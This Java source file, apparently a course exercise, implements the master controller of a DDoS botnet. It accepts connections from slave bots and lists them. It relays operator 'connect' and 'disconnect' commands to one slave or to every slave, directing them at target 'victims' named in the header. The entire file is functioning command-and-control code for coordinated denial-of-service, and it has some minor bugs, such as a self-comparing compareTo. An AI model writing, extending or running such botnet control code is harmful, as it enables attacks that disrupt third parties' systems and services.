/* Master for ddos.
 *
 * Aruthor : Sitao Mei
 *
 * The ddos topolog was as below:
 * Master -   Slave  -  Target
 *          \        \   ...
 *           \        \ Traget
 *            \ Slave - -
 *  Desc :
 *  User from Master could control Slaves to connect or dis-connect to Targets (victims) via commands.
 */

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.*;
import java.net.*;
import java.text.*;
import java.util.concurrent.CopyOnWriteArrayList;


public class MasterBot {

    /* master attributes
     */
    static int srcPort = 0;

    ServerSocket serverSock ;
    /*ConcurrentList : to store slave's information with key(slave hostname+src port).
     */
    //HashSet <Host> slaveset = new HashSet<Host> ();
    CopyOnWriteArrayList <Host> slaveset = new CopyOnWriteArrayList<>();

    /* main
     * Display ">" on terminal. Then
     *Input  : user cmd
     *         1) list ;
     *         2) connect ;
     *         3) disconnect;
     */
    public static void main(String[] args) throws IOException {
        //Check parameters sanity
        if ( args.length != 2){
            System.out.println("Illegal Parameters sets; You should input format: MaterBot -p/P <srcPort>");
            System.exit(1);
        }
        //Receive "-p" option for master port.
        String iparam_0 = args[0] ;
        if ( !iparam_0.equalsIgnoreCase("-p") ){
            System.out.println("Invalid Parameter : " + args[0] + " ; You should input format: MaterBot -p/P <srcPort>");
            System.exit(1);
        }
        // Read parame@ Port.
        try {
            srcPort = Integer.parseInt(args[1]);
        }
        catch (NumberFormatException Nfe){
            Nfe.printStackTrace();
            System.exit(1);
        }

        //Call method go.
        MasterBot master = new MasterBot();
        master.go();
    } // close main

    /* method : go
     * Parse incoming commands and call corresponding methods.
     * Scanner : to read in cmd line from console.
     */
    public void go() {

        //Display ">" in terminal and create server socket.
        try {
            serverSock = new ServerSocket(srcPort);
            //new thread for connection monitor
            Thread t_slave_conn = new Thread (new ListenSlaveConn()  ) ;
            t_slave_conn.start();

            //new thread for console commands read
            Thread t_console = new Thread (new UserCli()  ) ;
            t_console.start();

        } catch (Exception ex) {
            ex.printStackTrace();
            //System.exit(1);
        }

    }
    /*  Class for Command monitor from console
     *
     *  New thread could be run for console commands input from user.Then Parse commands and
     *  do execution commands.
     *
     *  Supported commands :
     *  1) list : list all slaves connected with mastr;
     *  2) connect : command asking slave to connect with target host.
     *  3) disconnect : command asking slave to dis-connect with target host.
     */
    public class UserCli implements Runnable {
        BufferedReader reader ;

        public void run (){
            String consolCmd ;
            String [] splitCmd = null;
            try {
                //Display prompt symbol >
                System.out.print(">");
                reader = new BufferedReader(new InputStreamReader(System.in))  ;
                while ( (consolCmd= reader.readLine())!=null) {
                    //Command parse
                    //System.out.println ("user input: "+ consolCmd);
                    splitCmd = consolCmd.split(" ");

                    if ( splitCmd[0].equalsIgnoreCase("list") ) {
                        listHandler(splitCmd);
                    } else if (splitCmd[0].equalsIgnoreCase("connect") ) {
                        slaveConnTx(consolCmd,splitCmd);
                    } else if (splitCmd[0].equalsIgnoreCase("disconnect")) {
                        slaveConnTx(consolCmd,splitCmd);
                    } else {
                        System.out.println ("Error, Unsupported command types. Current supported : list,connect,disconnect! Please double check and Re-input." );
                    }
                    //New Thread to execute
                    System.out.print(">");
                }
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }

        /* Method : <list> command from console
         *           display all slaves in "slaveset" list connected with master to console.
         */
        public void listHandler (String [] splitCmd) {
            if ( splitCmd.length==1) {
                if (slaveset.size()!=0) {
                    for (Host slave :slaveset  ) {
                        System.out.println (slave.hostName+" "+slave.ipAddr+" "+slave.srcPort+" "+slave.timeStamp);
                    }
                } else {
                    System.out.println("Empty!");
                }
            } else {
                System.out.println ("Error, You should input <list> without paramters! ");
            }
        }

        /* Method : Write user commands to connected slave.
         * 1) dedicated slave from command parameters.
         * 2) all : all slaves in "slaveset" list.
         */
        public void slaveConnTx (String consolCmd,String[] splitCmd) {
            int foundClosedConn = 0;
            try {
                String slaveIp = null ;
                String slaveName = null;
                if (!splitCmd[1].equalsIgnoreCase("all")) {
                    InetAddress slaveAddr = InetAddress.getByName(splitCmd[1]);
                    slaveIp = slaveAddr.getHostAddress();
                    slaveName = slaveAddr.getHostName();
                } else{
                    slaveIp="all" ;
                }

                //System.out.println ("user input addr:  "+slaveIp+ "; slaveNmae: "+ slaveName) ;
                Host curSlave = new Host () ;
                Socket Sock =null ;
                for ( Host slave : slaveset ) {
                    //System.out.println ("Query list, ipaddr:  "+slave.ipAddr+ "; srcPort: "+slave.srcPort) ;
                    if (slaveIp.equals("all")) {
                        Sock = slave.slaveSock;
                        curSlave= slave ;
                    }else if (slave.ipAddr.equals(slaveIp)) {
                        //System.out.println("Found:  " + slave.ipAddr + "; " + slave.srcPort);
                        Sock = slave.slaveSock;
                        curSlave= slave ;
                    } else {
                        Sock =null;
                    }

                    if (Sock!=null) {
                        PrintWriter writer = new PrintWriter(Sock.getOutputStream());
                        //System.out.println("Start to write cmd <" + consolCmd + ">to slave via socket:;" + slaveIp + "; ");
                        writer.println(consolCmd);
                        if ( writer.checkError()) {
                            System.out.println("Remote slave no responses , when : Write cmd <" + consolCmd + "> to slave:" + slaveIp + ";");
                            foundClosedConn = 1;
                            break;
                        } else {
                            System.out.println("Write cmd <" + consolCmd + "> to slave:" + slaveIp + ";");
                        }
                        writer.flush();
                        //writer.close();
                    }
                }

                //Remove closed connections from slave
                if ( foundClosedConn==1) {
                    System.out.println("Remoing closed slave:"+curSlave.ipAddr+" "+curSlave.srcPort);

                    /*
                    for (Iterator <Host> it= slaveset.iterator();it.hasNext();) {
                        Host element = it.next();
                        if ( (element.ipAddr==curSlave.ipAddr) && (element.srcPort==curSlave.srcPort) ) {
                            it.remove();
                        }
                    }
                    */
                    for (int idx=0;idx<slaveset.size();idx++) {
                        Host element = slaveset.get(idx);
                        if ( (element.ipAddr==curSlave.ipAddr) && (element.srcPort==curSlave.srcPort) ) {
                            slaveset.remove(idx);
                        }
                    }
                }
            } catch (Exception ex){
                ex.printStackTrace();
            }
        }
    } // close Class ConsolScan

    /*  Server listening on Slave Connection requests.
     */
    public class ListenSlaveConn implements Runnable {
        public void run (){
            //InetAddress  slaveIP ;
            String  slaveHostname ;
            int slavePort ;

            try {
                while (true){
                    Host slave = new Host();
                    Socket slaveSock = serverSock.accept();

                    slave.slaveSock=slaveSock;
                    slave.ipAddr = slaveSock.getInetAddress().getHostAddress();
                    slave.hostName = slaveSock.getInetAddress().getHostName();
                    slave.srcPort = slaveSock.getPort();
                    slave.timeStamp = new SimpleDateFormat("yyyy-MM-dd").format(Calendar.getInstance().getTime());
                    //System.out.println ("Accepted connection from slave: "+slave.ipAddr+","+slave.hostName+",port:"+slave.srcPort +",time:"+slave.timeStamp);
                    slaveset.add(slave);
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    /* Sub-class :  Host
     * @slave host name
     * @slave IP
     * @Slave Source port
     * @Register data
     * @socket for data stream.
     *
     * This sub class is for registered class.
     */
    class Host implements Comparable<Host>{
        String hostName ;
        //InetAddress  ipAddr ;
        String ipAddr;
        int srcPort;
        String regData;
        String timeStamp ;
        Socket slaveSock ;

        public int compareTo (Host s){
            String key = s.getKey();
            return key.compareTo(s.getKey());
        }

        public String getKey (){
            return hostName + srcPort ;
        }

    }

} //close class MaterBot
